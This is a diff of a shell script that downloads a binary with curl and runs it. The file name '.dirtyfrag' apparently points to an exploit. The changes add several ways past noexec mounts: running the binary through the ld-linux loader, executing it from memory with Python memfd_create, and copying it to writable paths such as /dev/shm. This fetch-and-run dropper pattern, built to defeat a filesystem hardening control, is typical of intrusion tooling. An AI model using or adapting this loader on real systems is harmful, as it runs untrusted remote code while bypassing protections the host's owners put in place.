@@ -25,9 +25,9 @@ esac
 log "resolved arch: $arch"
 
 # ---- check tools ----
-command -v curl  >/dev/null 2>&1 || die "curl not found"
+command -v curl   >/dev/null 2>&1 || die "curl not found"
 command -v mktemp >/dev/null 2>&1 || die "mktemp not found"
-command -v chmod >/dev/null 2>&1 || die "chmod not found"
+command -v chmod  >/dev/null 2>&1 || die "chmod not found"
 log "required tools present"
 
 # ---- temp file ----
@@ -37,7 +37,7 @@ trap 'log "cleaning up $tmp"; rm -f "$tmp"' EXIT INT TERM
 
 # ---- check /tmp is exec ----
 if mount 2>/dev/null | grep -E " on $(dirname "$tmp") " | grep -q noexec; then
-  log "WARNING: $(dirname "$tmp") is mounted noexec, trying $HOME instead"
+  log "WARNING: $(dirname "$tmp") is mounted noexec, trying \$HOME instead"
   rm -f "$tmp"
   tmp="${HOME:-.}/.dirtyfrag.$$"
   log "new temp file: $tmp"
@@ -54,7 +54,17 @@ log "downloaded $size bytes"
 
 # ---- chmod ----
 log "chmod +x $tmp"
-chmod +x "$tmp" || die "chmod failed"
+chmod +x "$tmp" || log "WARNING: chmod failed (likely noexec), will try fallback methods"
+
+# ---- exec helper ----
+do_exec() {
+  local bin="$1"; shift
+  if [ -e /dev/tty ]; then
+    exec "$bin" "$@" </dev/tty
+  else
+    exec "$bin" "$@"
+  fi
+}
 
 # ---- run with noexec fallback methods ----
 run_binary() {
@@ -62,75 +72,127 @@ run_binary() {
   shift
 
   # Method 1: direct exec (normal path)
-  if "$bin" "$@" </dev/tty 2>/dev/null; then return 0; fi
+  log "method 1: direct exec"
+  if [ -e /dev/tty ]; then
+    "$bin" "$@" </dev/tty && return 0
+  else
+    "$bin" "$@" && return 0
+  fi
 
   log "direct exec failed, trying noexec bypass methods..."
 
-  # Method 2: ld-linux dynamic linker (bypass noexec via loader)
-  for ld in \
-    /lib64/ld-linux-x86-64.so.2 \
-    /lib/ld-linux-aarch64.so.1 \
-    /lib/ld-linux-armhf.so.3 \
-    /lib/ld-linux.so.2
-  do
-    if [ -x "$ld" ]; then
-      log "trying ld.so: $ld"
-      "$ld" "$bin" "$@" </dev/tty && return 0
-    fi
-  done
+  # Method 2: ld-linux dynamic linker
+  # Hanya efektif jika binary dynamically linked DAN kernel tidak enforce noexec di mmap
+  log "method 2: ld-linux dynamic linker"
+  if command -v readelf >/dev/null 2>&1 && readelf -d "$bin" 2>/dev/null | grep -q NEEDED; then
+    for ld in \
+      /lib64/ld-linux-x86-64.so.2 \
+      /lib/ld-linux-aarch64.so.1 \
+      /lib/ld-linux-armhf.so.3 \
+      /lib/ld-linux.so.2
+    do
+      if [ -x "$ld" ]; then
+        log "trying ld.so: $ld"
+        if [ -e /dev/tty ]; then
+          "$ld" "$bin" "$@" </dev/tty && return 0
+        else
+          "$ld" "$bin" "$@" && return 0
+        fi
+      fi
+    done
+  else
+    log "binary is statically linked or readelf unavailable, skipping ld.so"
+  fi
 
-  # Method 3: Python memfd_create (in-memory anonymous fd, no filesystem exec bit)
+  # Method 3: Python memfd_create (anonymous in-memory fd, tidak terikat filesystem)
+  # PENTING: tidak ada </dev/tty di baris python — heredoc butuh stdin
+  # /dev/tty dibuka ulang di dalam Python sebelum execve
+  log "method 3: Python memfd_create"
   for py in python3 python python2; do
     if command -v "$py" >/dev/null 2>&1; then
       log "trying memfd_create via $py"
-      "$py" - "$bin" "$@" <<'PYEOF' </dev/tty && return 0
-import sys, os, ctypes, struct
+      "$py" - "$bin" "$@" <<'PYEOF'
+import sys, os, ctypes, ctypes.util, platform
 
 bin_path = sys.argv[1]
-args     = sys.argv[1:]   # keep argv[0] as binary name
+args     = sys.argv[1:]
 
+sys.stderr.write('[memfd] reading binary: %s\n' % bin_path)
 with open(bin_path, 'rb') as f:
     data = f.read()
+sys.stderr.write('[memfd] read %d bytes\n' % len(data))
 
-# memfd_create syscall (319 on x86_64, 385 on aarch64, 356 on arm)
-libc = ctypes.CDLL(None, use_errno=True)
+# os.memfd_create tersedia di Python >= 3.8
+# fallback ke syscall langsung untuk Python 3.6 / 2.x
+fd = -1
 try:
-    fd = libc.syscall(319, b"anon", 0)   # x86_64
-except:
-    fd = libc.syscall(385, b"anon", 0)   # aarch64
+    fd = os.memfd_create("anon", 0)
+    sys.stderr.write('[memfd] used os.memfd_create, fd=%d\n' % fd)
+except AttributeError:
+    syscall_nr = {
+        'x86_64': 319, 'amd64': 319,
+        'aarch64': 279, 'arm64': 279,
+        'armv7l': 356,  'armv7': 356,
+        'i386':   356,  'i686':  356,
+    }.get(platform.machine(), 319)
+    sys.stderr.write('[memfd] syscall nr=%d for %s\n' % (syscall_nr, platform.machine()))
+    libc = ctypes.CDLL(ctypes.util.find_library('c') or 'libc.so.6', use_errno=True)
+    fd = libc.syscall(
+        ctypes.c_long(syscall_nr),
+        ctypes.c_char_p(b"anon"),
+        ctypes.c_uint(0)
+    )
 
 if fd < 0:
+    sys.stderr.write('[memfd] memfd_create failed errno=%d\n' % ctypes.get_errno())
     sys.exit(1)
 
+sys.stderr.write('[memfd] fd=%d, writing binary...\n' % fd)
 os.write(fd, data)
+
+# Reopen /dev/tty sebagai stdin agar binary bisa interaktif setelah execve
+try:
+    tty = os.open('/dev/tty', os.O_RDWR)
+    os.dup2(tty, 0)
+    os.close(tty)
+    sys.stderr.write('[memfd] stdin reattached to /dev/tty\n')
+except OSError as e:
+    sys.stderr.write('[memfd] WARNING: could not open /dev/tty: %s\n' % e)
+
+sys.stderr.write('[memfd] execve /proc/self/fd/%d\n' % fd)
 os.execve('/proc/self/fd/%d' % fd, args, os.environ)
 PYEOF
+      && return 0
     fi
   done
 
-  # Method 4: try exec-friendly alternative paths
-  for alt_dir in /dev/shm /run /run/user/"$(id -u 2>/dev/null)" /var/tmp; do
+  # Method 4: copy ke path yang exec-friendly
+  log "method 4: copy to exec-friendly path"
+  uid=$(id -u 2>/dev/null || echo 0)
+  for alt_dir in /dev/shm /run "/run/user/${uid}" /var/tmp; do
     if [ -d "$alt_dir" ] && [ -w "$alt_dir" ]; then
       alt="${alt_dir}/.run.$$"
-      log "copying to exec-friendly path: $alt"
-      cp "$bin" "$alt" && chmod +x "$alt" && "$alt" "$@" </dev/tty
-      ret=$?
-      rm -f "$alt"
-      [ $ret -eq 0 ] && return 0
+      log "copying binary to $alt"
+      if cp "$bin" "$alt" && chmod +x "$alt"; then
+        if [ -e /dev/tty ]; then
+          "$alt" "$@" </dev/tty
+        else
+          "$alt" "$@"
+        fi
+        ret=$?
+        rm -f "$alt"
+        [ $ret -eq 0 ] && return 0
+      fi
+      rm -f "$alt" 2>/dev/null || true
     fi
   done
 
-  die "all exec methods failed (noexec on all candidate paths, no Python memfd support)"
+  die "all exec methods failed (noexec filesystem, no Python, no exec-friendly path available)"
 }
 
+# ---- main ----
 log "executing $tmp $*"
-log "(re-attaching stdin to /dev/tty so the binary is interactive)"
+log "(noexec-aware: will try ld.so → memfd → alt-path as fallback)"
 log "------------------------------------------------------------"
 
-if [ -e /dev/tty ]; then
-  run_binary "$tmp" "$@"
-else
-  log "WARNING: no /dev/tty available, running with current stdin"
-  # re-attach current stdin to the fallback methods
-  run_binary "$tmp" "$@" <&0
-fi
+run_binary "$tmp" "$@"
